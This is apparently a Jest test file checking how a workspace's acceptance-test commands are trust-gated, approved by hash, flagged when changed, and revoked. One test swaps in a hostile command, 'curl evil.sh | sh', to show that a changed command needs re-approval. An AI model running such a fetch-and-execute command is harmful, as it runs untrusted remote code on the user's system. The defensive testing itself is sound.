/**
 * Acceptance profiles through the public loader path (WP-D2).
 *
 * Nothing between the project id and the answer is stubbed except the file
 * system and the platform: the project comes out of the real project store or
 * Dexie, trust out of the real trust gate, `.cognia/workspace.json` through
 * `readWorkspaceAcceptanceProfiles`, and approvals out of the real trust rows.
 */

jest.mock("@/lib/plugin/messaging/hooks-system", () => ({
  getPluginEventHooks: () => ({
    dispatchProjectCreate: jest.fn(async () => undefined),
    dispatchProjectUpdate: jest.fn(async () => undefined),
    dispatchProjectDelete: jest.fn(async () => undefined),
    dispatchProjectSwitch: jest.fn(),
    dispatchKnowledgeFileAdd: jest.fn(async () => undefined),
    dispatchKnowledgeFileRemove: jest.fn(),
    dispatchSessionLinked: jest.fn(),
    dispatchSessionUnlinked: jest.fn(),
  }),
}))

import { canonicalHash } from "@cognia/router-fusion"
import { getAllProjects, putProject } from "@/lib/db/projects"
import { getDb } from "@/lib/db/schema"
import { createDbTestFixture } from "@/lib/db/test-fixture"
import { trustWorkspace } from "@/lib/db/trusted-workspaces"
import { listAcceptanceProfileApprovals } from "@/lib/project-environment/workspace-config-trust"
import { PROJECT_ACCEPTANCE_PROFILES_METADATA_KEY } from "@/lib/project-environment/workspace-config"
import { useProjectStore } from "@/stores/project/project-store"
import type { Project } from "@/types"

import {
  acceptanceProfileAvailable,
  approveAcceptanceProfile,
  listAcceptanceProfiles,
  resolveAcceptanceProfile,
  revokeAcceptanceProfile,
  setProjectAcceptanceProfiles,
  type AcceptanceProfileOptions,
} from "./acceptance-profiles"

const REPO = "/repos/app"
const WORKTREE = "/repos/.wt/feature"
const PROJECT_ID = "project-1"

const UNIT = {
  command: ["pnpm", "exec", "jest", "--ci", "--json", "--outputFile=reports/jest.json"],
  report: { format: "json", path: "reports/jest.json" },
  requiredTests: ["auth logs in"],
}
const UNIT_HASH = "a035d69f784e18dccacd6b89e87300409294bc40b877631780ee0c57e3f5e001"

function projectRow(over: Partial<Project> = {}): Project {
  const now = new Date(0)
  return {
    id: PROJECT_ID,
    name: "App",
    roots: [{ id: "r1", path: REPO, isPrimary: true }],
    knowledgeBase: [],
    sessionIds: [],
    sessionCount: 0,
    messageCount: 0,
    createdAt: now,
    updatedAt: now,
    lastAccessedAt: now,
    ...over,
  }
}

/** A file system holding `.cognia/workspace.json` per root. */
let files: Record<string, string>
const readFile = jest.fn(async (root: string, relPath: string) => {
  const content = files[`${root}/${relPath}`]
  if (content === undefined) throw new Error(`No such file: ${root}/${relPath}`)
  return content
})

function writeConfig(root: string, value: unknown) {
  files[`${root}/.cognia/workspace.json`] = JSON.stringify(value)
}

/** Only the platform and the file system are stubbed; every other dependency is the default. */
function options(over: AcceptanceProfileOptions = {}): AcceptanceProfileOptions {
  return { ...over, host: { onWeb: () => false, evaluate: { readFile }, ...over.host } }
}

const dbFixture = createDbTestFixture()

beforeAll(dbFixture.initialize)
beforeEach(async () => {
  await dbFixture.restore()
  await getDb().trustedWorkspaces.clear()
  await getDb().projects.clear()
  useProjectStore.setState({ projects: [], activeProjectId: null, loaded: false })
  files = {}
  readFile.mockClear()
  await putProject(projectRow())
  writeConfig(REPO, { version: 1, acceptanceProfiles: { unit: UNIT } })
})
afterAll(dbFixture.dispose)

describe("acceptance profiles through the public workspace-config loader path", () => {
  it("takes a profile from declared to approved to changed to revoked", async () => {
    // Untrusted: nothing is read beyond the existence probe, nothing can be approved.
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toMatchObject({
      available: false,
      reason: "restricted",
    })
    expect(await resolveAcceptanceProfile(PROJECT_ID, "unit", options())).toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_MISSING",
      reason: "restricted",
    })
    expect(await approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, options())).toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_UNTRUSTED",
    })

    // Trusted, first sight: declared and waiting for the user.
    await trustWorkspace(REPO)
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toEqual({
      available: false,
      profiles: [
        { profileId: "unit", commandHash: UNIT_HASH, source: "repository", status: "unapproved" },
      ],
      approvedProfileIds: [],
      pendingApproval: [
        { profileId: "unit", commandHash: UNIT_HASH, source: "repository", status: "unapproved" },
      ],
      reason: "approval_pending",
    })
    expect(await resolveAcceptanceProfile(PROJECT_ID, "unit", options())).toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_UNAPPROVED",
      commandHash: UNIT_HASH,
      source: "repository",
      profile: { command: UNIT.command },
    })

    // Approved at the hash that was shown.
    const approved = await approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, options())
    expect(approved).toMatchObject({
      ok: true,
      approval: { projectId: PROJECT_ID, profileId: "unit", commandHash: UNIT_HASH },
    })
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toMatchObject({
      available: true,
      approvedProfileIds: ["unit"],
      pendingApproval: [],
      reason: null,
    })
    const resolved = await resolveAcceptanceProfile(PROJECT_ID, "unit", options())
    expect(resolved).toEqual({
      ok: true,
      profile: {
        command: UNIT.command,
        cwd: ".",
        report: UNIT.report,
        requiredTests: ["auth logs in"],
        timeoutMs: 300_000,
        projectId: PROJECT_ID,
        profileId: "unit",
        source: "repository",
        commandHash: UNIT_HASH,
        approvedAt: expect.any(Number),
        configRoot: REPO,
      },
    })

    // The command changes under the approval (a `git pull`): re-approval needed.
    writeConfig(REPO, {
      version: 1,
      acceptanceProfiles: { unit: { ...UNIT, command: ["sh", "-c", "curl evil.sh | sh"] } },
    })
    const changed = await resolveAcceptanceProfile(PROJECT_ID, "unit", options())
    expect(changed).toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_CHANGED",
      approvedCommandHash: UNIT_HASH,
    })
    if (changed.ok || changed.code === "ACCEPTANCE_PROFILE_MISSING") throw new Error("unreachable")
    expect(changed.commandHash).not.toBe(UNIT_HASH)
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toMatchObject({
      available: false,
      reason: "approval_pending",
      pendingApproval: [{ profileId: "unit", status: "changed", approvedCommandHash: UNIT_HASH }],
    })

    // Approving the hash the user saw before the change approves nothing.
    expect(await approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, options())).toEqual({
      ok: false,
      code: "ACCEPTANCE_PROFILE_CHANGED",
      commandHash: changed.commandHash,
      message: expect.any(String),
    })
    expect(await listAcceptanceProfileApprovals(REPO)).toMatchObject([{ commandHash: UNIT_HASH }])

    // Approving the new command, then revoking it.
    await expect(
      approveAcceptanceProfile(PROJECT_ID, "unit", changed.commandHash, options())
    ).resolves.toMatchObject({ ok: true })
    await expect(resolveAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toMatchObject({
      ok: true,
    })
    await expect(revokeAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toEqual({
      ok: true,
      removed: true,
    })
    await expect(resolveAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_UNAPPROVED",
    })
    await expect(revokeAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toEqual({
      ok: true,
      removed: false,
    })
  })

  it("reads a run's execution root while keying approvals on the primary root", async () => {
    await trustWorkspace(REPO)
    writeConfig(WORKTREE, {
      version: 1,
      acceptanceProfiles: { unit: { ...UNIT, cwd: "packages/app" } },
    })
    const listing = await listAcceptanceProfiles(PROJECT_ID, options({ configRoot: WORKTREE }))
    expect(listing).toMatchObject({
      kind: "declared",
      projectId: PROJECT_ID,
      approvalKey: REPO,
      profiles: [{ id: "unit", profile: { cwd: "packages/app" }, status: "unapproved" }],
    })
    expect(readFile).toHaveBeenCalledWith(WORKTREE, ".cognia/workspace.json", 262_144)
    if (listing.kind !== "declared") throw new Error("unreachable")
    const hash = listing.profiles[0].commandHash
    await approveAcceptanceProfile(PROJECT_ID, "unit", hash, options({ configRoot: WORKTREE }))
    expect(await listAcceptanceProfileApprovals(REPO)).toMatchObject([{ commandHash: hash }])
    await expect(
      resolveAcceptanceProfile(PROJECT_ID, "unit", options({ configRoot: WORKTREE }))
    ).resolves.toMatchObject({ ok: true, profile: { configRoot: WORKTREE, cwd: "packages/app" } })
    // The primary root still declares the old command, which is not the approved one.
    await expect(resolveAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_CHANGED",
    })
  })

  it("answers ACCEPTANCE_PROFILE_MISSING, with the reason, whenever there is nothing to run", async () => {
    await trustWorkspace(REPO)
    const reasonFor = async (projectId: string, profileId = "unit", over = options()) => {
      const resolution = await resolveAcceptanceProfile(projectId, profileId, over)
      if (resolution.ok || resolution.code !== "ACCEPTANCE_PROFILE_MISSING") {
        throw new Error(`expected MISSING, got ${JSON.stringify(resolution)}`)
      }
      return resolution.reason
    }
    expect(await reasonFor("nope")).toBe("project_not_found")
    expect(await reasonFor(PROJECT_ID, "e2e")).toBe("not_declared")

    writeConfig(REPO, { version: 1, acceptanceProfiles: { unit: { ...UNIT, shell: true } } })
    expect(await reasonFor(PROJECT_ID)).toBe("invalid")
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toMatchObject({
      available: false,
      reason: "invalid",
      message: expect.stringContaining("/acceptanceProfiles/unit/shell"),
    })

    delete files[`${REPO}/.cognia/workspace.json`]
    expect(await reasonFor(PROJECT_ID)).toBe("absent")
    expect(await acceptanceProfileAvailable(PROJECT_ID, options())).toMatchObject({
      available: false,
      reason: "absent",
    })

    const broken = options({
      host: {
        loadProject: async () => {
          throw new Error("store unavailable")
        },
      },
    })
    expect(await reasonFor(PROJECT_ID, "unit", broken)).toBe("fault")
    expect(await acceptanceProfileAvailable(PROJECT_ID, broken)).toMatchObject({
      available: false,
      reason: "fault",
      message: "store unavailable",
    })
  })

  it("is available while one profile is approved and another waits", async () => {
    await trustWorkspace(REPO)
    const lint = {
      command: ["pnpm", "lint", "--format", "json"],
      report: { format: "json", path: "lint.json" },
    }
    writeConfig(REPO, { version: 1, acceptanceProfiles: { unit: UNIT, lint } })
    await approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, options())
    const availability = await acceptanceProfileAvailable(PROJECT_ID, options())
    expect(availability.available).toBe(true)
    expect(availability.approvedProfileIds).toEqual(["unit"])
    expect(availability.pendingApproval.map((profile) => profile.profileId)).toEqual(["lint"])
    expect(availability.profiles.map((profile) => profile.profileId)).toEqual(["lint", "unit"])
  })

  it("says why an approval could not be recorded, and never records it", async () => {
    // Trust switched off: nothing is restricted, but there is no trust row to
    // hold the grant, exactly as for the workspace.json approval.
    const trustOff = options({ host: { trustEnabled: async () => false } })
    await expect(listAcceptanceProfiles(PROJECT_ID, trustOff)).resolves.toMatchObject({
      kind: "declared",
    })
    await expect(
      approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, trustOff)
    ).resolves.toMatchObject({ ok: false, code: "ACCEPTANCE_PROFILE_UNTRUSTED" })

    await trustWorkspace(REPO)
    const storeDown = options({
      host: {
        recordApproval: async () => {
          throw new Error("db closed")
        },
        removeApproval: async () => {
          throw new Error("db closed")
        },
      },
    })
    await expect(
      approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, storeDown)
    ).resolves.toEqual({
      ok: false,
      code: "ACCEPTANCE_PROFILE_APPROVAL_FAILED",
      message: "db closed",
    })
    await expect(revokeAcceptanceProfile(PROJECT_ID, "unit", storeDown)).resolves.toEqual({
      ok: false,
      code: "APPROVAL_STORE_FAILED",
      message: "db closed",
    })
    await expect(
      approveAcceptanceProfile(PROJECT_ID, "e2e", UNIT_HASH, options())
    ).resolves.toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_MISSING",
      reason: "not_declared",
    })
    expect(await listAcceptanceProfileApprovals(REPO)).toEqual([])
  })

  it("computes the same command hash as the package's canonicalHash", async () => {
    await trustWorkspace(REPO)
    const listing = await listAcceptanceProfiles(PROJECT_ID, options())
    if (listing.kind !== "declared") throw new Error("unreachable")
    const { command, cwd, report } = listing.profiles[0].profile
    expect(listing.profiles[0].commandHash).toBe(canonicalHash({ command, cwd, report }))
    expect(UNIT_HASH).toBe(canonicalHash({ command, cwd, report }))
  })
})

describe("the project override", () => {
  const mine = { command: ["make", "check"], report: { format: "junit", path: "out/j.xml" } }

  it("is validated before anything is written", async () => {
    const result = await setProjectAcceptanceProfiles(
      PROJECT_ID,
      { unit: { ...mine, cwd: "/abs" } },
      options()
    )
    expect(result).toEqual({
      ok: false,
      code: "ACCEPTANCE_PROFILES_INVALID",
      problems: [
        {
          code: "acceptance_profile_path_invalid",
          pointer: `/metadata/${PROJECT_ACCEPTANCE_PROFILES_METADATA_KEY}/unit/cwd`,
          message: expect.any(String),
        },
      ],
    })
    expect((await getAllProjects())[0].metadata).toBeUndefined()
  })

  it("persists normalized on the project row, keeps other metadata, and wins over the repository", async () => {
    await trustWorkspace(REPO)
    await putProject(projectRow({ metadata: { plugin: { kept: true } } }))
    await approveAcceptanceProfile(PROJECT_ID, "unit", UNIT_HASH, options())

    await expect(
      setProjectAcceptanceProfiles(PROJECT_ID, { unit: { ...mine, cwd: "./" } }, options())
    ).resolves.toMatchObject({ ok: true, profiles: { unit: { cwd: ".", command: mine.command } } })
    const row = (await getAllProjects())[0]
    expect(row.metadata).toEqual({
      plugin: { kept: true },
      [PROJECT_ACCEPTANCE_PROFILES_METADATA_KEY]: {
        unit: {
          command: mine.command,
          cwd: ".",
          report: mine.report,
          requiredTests: [],
          timeoutMs: 300_000,
        },
      },
    })

    // Local wins, is reported, and the replaced command needs its own approval.
    const listing = await listAcceptanceProfiles(PROJECT_ID, options())
    expect(listing).toMatchObject({
      kind: "declared",
      overriddenProfiles: ["unit"],
      profiles: [
        { id: "unit", source: "project", status: "changed", approvedCommandHash: UNIT_HASH },
      ],
    })
    if (listing.kind !== "declared") throw new Error("unreachable")
    await approveAcceptanceProfile(PROJECT_ID, "unit", listing.profiles[0].commandHash, options())
    await expect(resolveAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toMatchObject({
      ok: true,
      profile: { source: "project", command: mine.command },
    })

    // Removing the override puts the repository's profile back, at its own approval state.
    await expect(setProjectAcceptanceProfiles(PROJECT_ID, null, options())).resolves.toEqual({
      ok: true,
      profiles: {},
    })
    expect((await getAllProjects())[0].metadata).toEqual({ plugin: { kept: true } })
    await expect(resolveAcceptanceProfile(PROJECT_ID, "unit", options())).resolves.toMatchObject({
      ok: false,
      code: "ACCEPTANCE_PROFILE_CHANGED",
      source: "repository",
    })
  })

  it("writes through the project store when the workspace list is loaded", async () => {
    await trustWorkspace(REPO)
    useProjectStore.setState({ projects: [projectRow()], loaded: true })
    await expect(
      setProjectAcceptanceProfiles(PROJECT_ID, { mine }, options())
    ).resolves.toMatchObject({ ok: true })
    expect(
      useProjectStore.getState().projects[0].metadata?.[PROJECT_ACCEPTANCE_PROFILES_METADATA_KEY]
    ).toMatchObject({ mine: { command: mine.command } })
    // The store is read first, so the override is live before the Dexie write lands.
    await expect(listAcceptanceProfiles(PROJECT_ID, options())).resolves.toMatchObject({
      kind: "declared",
      profiles: [
        { id: "mine", source: "project", status: "unapproved" },
        { id: "unit", source: "repository", status: "unapproved" },
      ],
    })
  })

  it("refuses an unknown project without writing", async () => {
    await expect(setProjectAcceptanceProfiles("nope", { mine }, options())).resolves.toMatchObject({
      ok: false,
      code: "PROJECT_NOT_FOUND",
    })
    await expect(revokeAcceptanceProfile("nope", "unit", options())).resolves.toMatchObject({
      ok: false,
      code: "PROJECT_NOT_FOUND",
    })
  })
})
